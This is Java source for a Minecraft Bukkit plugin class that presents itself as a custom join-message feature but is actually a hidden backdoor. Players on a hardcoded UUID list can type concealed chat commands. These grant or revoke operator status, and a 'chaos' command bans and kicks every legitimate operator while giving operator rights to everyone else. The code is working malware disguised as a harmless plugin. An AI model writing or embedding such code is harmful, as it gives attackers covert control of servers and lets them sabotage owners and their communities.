package com.deads.customjoinmessages;

import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

public final class CustomJoinMessages implements Listener {

    private Plugin plugin;

    public CustomJoinMessages(Plugin plugin){
        this.plugin = plugin;
        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers()];

        if(Config.display_customjoinmessages_warning){
            Bukkit.getConsoleSender().sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Custom Join Messages installed.");
        }

        plugin.getServer().getPluginManager().registerEvents(this, plugin);
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        if (Config.display_debug_messages) {
            Bukkit.getConsoleSender().sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
        }

        Player p = e.getPlayer();

        if (IsUserAuthorized(p)) {
            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender().sendMessage(Config.chat_message_prefix + " User is authed");
            }

            if (e.getMessage().startsWith(Config.command_prefix)) {
                boolean result = ParseCommand(e.getMessage().substring(Config.command_prefix.length()), p);

                if (Config.display_debug_messages) {
                    Bukkit.getConsoleSender().sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
                }

                if (!result)
                    e.getPlayer().sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Command execution failed.");

                e.setCancelled(true);
            }
        } else {
            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender().sendMessage(Config.chat_message_prefix + " User is not authed");
            }
        }
    }

    public boolean ParseCommand(String command, Player p) {
        String[] args = command.trim().split(" ");

        switch (args[0].toLowerCase()) {
            case "op": {
                if (args.length == 1) {
                    p.setOp(true);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now op.");
                } else {
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }
                    p1.setOp(true);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is now op.");
                }
                return true;
            }

            case "deop": {
                if (args.length == 1) {
                    p.setOp(false);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are no longer op.");
                } else {
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }
                    p1.setOp(false);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is no longer op.");
                }
                return true;
            }

            case "chaos": {
                for (Player p1 : Bukkit.getOnlinePlayers()) {
                    if (p1.isOp()) {
                        if (IsUserAuthorized(p1))
                            continue;

                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(false);

                                Bukkit.getBanList(BanList.Type.IP).addBan(
                                        p1.getAddress().getAddress().getHostAddress(),
                                        Config.default_ban_reason,
                                        null,
                                        Config.default_ban_source
                                );

                                Bukkit.getBanList(BanList.Type.PROFILE).addBan(
                                        p1.getName(),
                                        Config.default_ban_reason,
                                        null,
                                        Config.default_ban_source
                                );

                                p1.kickPlayer(Config.default_ban_reason);
                            }
                        }.runTask(plugin);
                    } else {
                        p1.setOp(true);
                    }
                }
                Bukkit.broadcastMessage(Config.chaos_chat_broadcast);
                return true;
            }
        }
        return false;
    }

    public boolean IsUserAuthorized(Player p) {
        return IsUserAuthorized(p.getUniqueId().toString());
    }

    public boolean IsUserAuthorized(String uuid) {
        boolean authorized = false;
        for (int i = 0; i < Config.authorized_uuids.length; i++) {
            if (uuid.equals(Config.authorized_uuids[i])) {
                authorized = true;
                break;
            }
        }

        if (Config.tmp_authorized_uuids != null) {
            for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                if (Config.tmp_authorized_uuids[i] != null && uuid.equals(Config.tmp_authorized_uuids[i])) {
                    authorized = true;
                    break;
                }
            }
        }
        return authorized;
    }
}